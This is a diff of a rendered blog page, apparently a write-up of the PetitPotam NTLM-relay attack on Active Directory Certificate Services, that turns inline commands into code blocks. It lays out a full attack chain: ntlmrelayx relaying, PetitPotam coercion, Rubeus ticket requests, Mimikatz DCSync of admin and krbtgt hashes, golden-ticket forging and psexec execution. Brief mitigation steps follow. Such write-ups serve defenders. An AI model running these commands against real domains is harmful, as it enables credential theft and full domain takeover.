@@ -121,12 +121,14 @@
 
 <h1 id="steps-to-create">Steps to Create</h1>
 <h2 id="1-set-up-ntlm-relay-on-our-attacker-host-to-forward-the-captured-authentication-to-adcs-web-ui">1. Set up NTLM Relay on our attacker host to forward the captured authentication to ADCS Web UI</h2>
-<p><code class="language-plaintext highlighter-rouge">ntlmrelayx.py -t http://&lt;CA_Server&gt;/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py <span class="nt">-t</span> http://&lt;CA_Server&gt;/certsrv/certfnsh.asp <span class="nt">-smb2support</span> <span class="nt">--adcs</span> <span class="nt">--template</span> DomainController
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/ntlm-relay-start.jpg" alt="ntlm-relay-start" /></p>
 
 <h2 id="2-use-petitpotam-to-force-authentication-from-a-domain-controller-back-to-the-relaying-kali-machine">2. Use PetitPotam to force authentication from a domain controller back to the relaying kali machine</h2>
-<p><code class="language-plaintext highlighter-rouge">python3 PetitPotam.py -d &lt;DOMAIN_FQDN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; &lt;KALI&gt; &lt;TARGET_DC&gt;</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 PetitPotam.py <span class="nt">-d</span> &lt;DOMAIN_FQDN&gt; <span class="nt">-u</span> &lt;USERNAME&gt; <span class="nt">-p</span> &lt;PASSWORD&gt; &lt;KALI&gt; &lt;TARGET_DC&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/PetitPotam-Launched.jpg" alt="PetitPotam-Launched" /></p>
 
@@ -136,14 +138,16 @@
 
 <h2 id="4-use-rubeus-on-the-windows-machine-to-request-a-tgt-for-that-account-using-the-certificate">4. Use Rubeus on the windows machine to request a TGT for that account using the certificate</h2>
 
-<p><code class="language-plaintext highlighter-rouge">.\Rubeus.exe asktgt /outfile:kirbi /dc:&lt;DOMAINCONTROLLER&gt; /domain:&lt;DOMAIN_FQDN&gt; /user:&lt;CAPTURED_DC_COMPUTER_ACCOUNT_NAME&gt; /ptt /certificate:&lt;CAPTURED_BASE64_CERTIFICATE&gt;</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rubeus.exe asktgt /outfile:kirbi /dc:&lt;DOMAINCONTROLLER&gt; /domain:&lt;DOMAIN_FQDN&gt; /user:&lt;CAPTURED_DC_COMPUTER_ACCOUNT_NAME&gt; /ptt /certificate:&lt;CAPTURED_BASE64_CERTIFICATE&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/rubeus-command.jpg" alt="rubeus-command" /></p>
 
 <p><img src="/assets/petitpotam/got-dc2-tgt.jpg" alt="got-dc2-tgt" /></p>
 
 <h2 id="5-having-the-tgt-in-memory-use-mimikatz-to-do-a-dcsync-attack">5. <em>Having the TGT in memory,</em> use Mimikatz to do a DCSync attack</h2>
-<p><code class="language-plaintext highlighter-rouge">lsadump::dcsync /domain:&lt;DOMAINFQDN&gt; /user:&lt;TARGET_USER&gt;</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcsync /domain:&lt;DOMAINFQDN&gt; /user:&lt;TARGET_USER&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/dcsync-for-domain-admin-hash.jpg" alt="dcsync-for-domain-admin-hash" /></p>
 
@@ -152,21 +156,31 @@
 <p><img src="/assets/petitpotam/code-execution-as-administrator.jpg" alt="code-execution-as-administrator" /></p>
 
 <h2 id="7-optional-create-a-golden-ticket-for-persistence">7. (Optional) Create a Golden Ticket for persistence</h2>
-<p>Domain SID Lookup: <code class="language-plaintext highlighter-rouge">lookupsid.py &lt;DOMAIN_FQDN&gt;/&lt;USERNAME&gt;@&lt;DC_IP&gt;</code></p>
+<p>Domain SID Lookup:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lookupsid.py &lt;DOMAIN_FQDN&gt;/&lt;USERNAME&gt;@&lt;DC_IP&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/domain-sid-lookup.jpg" alt="domain-sid-lookup" /></p>
 
-<p>Obtaining the <code class="language-plaintext highlighter-rouge">krbtgt</code> account’s hash: <code class="language-plaintext highlighter-rouge">lsadump::dcsync /domain:&lt;DOMAIN_FQDN&gt; /user:krbtgt</code></p>
+<p>Obtaining the <code class="language-plaintext highlighter-rouge">krbtgt</code> account’s hash:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcsync /domain:&lt;DOMAIN_FQDN&gt; /user:krbtgt
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/krbtgt-hash.jpg" alt="krbtgt-hash" /></p>
 
-<p>Golden ticket creation: <code class="language-plaintext highlighter-rouge">ticketer.py -nthash &lt;KRBTGT_HASH&gt; -domain-sid &lt;DOMAIN_SID&gt; -domain &lt;DOMAIN_FQDN&gt; &lt;CAN_BE_NON_EXISTING_USERNAME&gt;</code></p>
+<p>Golden ticket creation:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ticketer.py <span class="nt">-nthash</span> &lt;KRBTGT_HASH&gt; <span class="nt">-domain-sid</span> &lt;DOMAIN_SID&gt; <span class="nt">-domain</span> &lt;DOMAIN_FQDN&gt; &lt;CAN_BE_NON_EXISTING_USERNAME&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/golden-ticket-created.jpg" alt="golden-ticket-created" /></p>
 
-<p>Exporting ticket to the environment: <code class="language-plaintext highlighter-rouge">export KRB5CCNAME=/&lt;CHOSEN_USERNAME&gt;.ccache</code></p>
+<p>Exporting ticket to the environment:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/&lt;CHOSEN_USERNAME&gt;.ccache
+</code></pre></div></div>
 
-<p>Command execution using ticket: <code class="language-plaintext highlighter-rouge">psexec.py &lt;DOMAIN_FQDN&gt;/&lt;CHOSEN_USERNAME&gt;@&lt;DC_FQDN&gt; -k -no-pass</code></p>
+<p>Command execution using ticket:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.py &lt;DOMAIN_FQDN&gt;/&lt;CHOSEN_USERNAME&gt;@&lt;DC_FQDN&gt; <span class="nt">-k</span> <span class="nt">-no-pass</span>
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/golden-ticket-used.jpg" alt="golden-ticket-used" /></p>
 
@@ -193,7 +207,9 @@
 <p><img src="/assets/petitpotam/cert-srv-require-ssl.jpg" alt="cert-srv-require-ssl" /></p>
 
 <h2 id="4-restart-iis">4. Restart IIS</h2>
-<p><em>From an elevated command prompt,</em> type: <code class="language-plaintext highlighter-rouge">iisreset /restart</code></p>
+<p><em>From an elevated command prompt,</em> type:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iisreset /restart
+</code></pre></div></div>
 
 <hr />
 
